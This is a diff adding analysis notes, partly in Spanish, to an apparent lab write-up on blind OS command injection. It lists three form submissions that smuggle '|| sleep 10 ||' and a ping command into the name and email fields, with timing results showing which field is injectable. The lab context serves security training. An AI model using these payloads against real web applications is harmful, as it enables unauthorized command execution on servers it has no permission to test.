@@ -9,3 +9,9 @@ To solve the lab, exploit the blind OS command injection vulnerability to cause 
 Análisi:
 -------
 
+csrf=apYYIhVnNdu7U1Gnv1PgxmmTkMH1jqnN&name=lspci4|| sleep 10 ||&email=lspci4%40lspci4.com&subject=test&message=Esto+es+una+prueba --> Response < 333 millis
+
+csrf=apYYIhVnNdu7U1Gnv1PgxmmTkMH1jqnN&name=lspci4&email=lspci4%40lspci4.com|| sleep 10 ||&subject=test&message=Esto+es+una+prueba --> OK Response 10,399 millis
+
+csrf=apYYIhVnNdu7U1Gnv1PgxmmTkMH1jqnN&name=lspci4&email=x||ping -c 10 127.0.0.1||&subject=test&message=Esto+es+una+prueba --> OK Response 9,565 millis
+
